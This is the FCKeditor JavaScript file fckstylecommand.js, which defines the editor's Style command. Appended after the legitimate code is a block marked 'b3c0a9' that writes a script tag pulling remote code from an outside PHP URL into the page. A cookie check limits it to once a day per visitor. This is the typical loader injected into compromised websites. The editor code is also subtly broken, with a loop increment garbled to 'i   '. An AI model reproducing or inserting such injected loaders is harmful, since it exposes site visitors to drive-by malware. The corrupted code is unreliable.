/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckstylecommand.js
 * 	FCKStyleCommand Class: represents the "Style" command.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKStyleCommand = function()
{
	this.Name = 'Style' ;

	// Load the Styles defined in the XML file.
	this.StylesLoader = new FCKStylesLoader() ;
	this.StylesLoader.Load( FCKConfig.StylesXmlPath ) ;
	this.Styles = this.StylesLoader.Styles ;
}

FCKStyleCommand.prototype.Execute = function( styleName, styleComboItem )
{
	FCKUndo.SaveUndoStep() ;

	if ( styleComboItem.Selected )
		styleComboItem.Style.RemoveFromSelection() ;
	else
		styleComboItem.Style.ApplyToSelection() ;

	FCKUndo.SaveUndoStep() ;

	FCK.Focus() ;
	
	FCK.Events.FireEvent( "OnSelectionChange" ) ;
}

FCKStyleCommand.prototype.GetState = function()
{
	var oSelection = FCK.EditorDocument.selection ;
	
	if ( FCKSelection.GetType() == 'Control' )
	{
		var e = FCKSelection.GetSelectedElement() ;
		if ( e )
			return this.StylesLoader.StyleGroups[ e.tagName ] ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
	}

	return FCK_TRISTATE_OFF ;
}

FCKStyleCommand.prototype.GetActiveStyles = function()
{
	var aActiveStyles = new Array() ;
	
	if ( FCKSelection.GetType() == 'Control' )
		this._CheckStyle( FCKSelection.GetSelectedElement(), aActiveStyles, false ) ;
	else
		this._CheckStyle( FCKSelection.GetParentElement(), aActiveStyles, true ) ;
		
	return aActiveStyles ;
}

FCKStyleCommand.prototype._CheckStyle = function( element, targetArray, checkParent )
{
	if ( ! element )
		return ;

	if ( element.nodeType == 1 )
	{
		var aStyleGroup = this.StylesLoader.StyleGroups[ element.tagName ] ;
		if ( aStyleGroup )
		{
			for ( var i = 0 ; i < aStyleGroup.length ; i   )
			{
				if ( aStyleGroup[i].IsEqual( element ) )
					targetArray[ targetArray.length ] = aStyleGroup[i] ;
			}		
		}
	}
	
	if ( checkParent )
		this._CheckStyle( element.parentNode, targetArray, checkParent ) ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
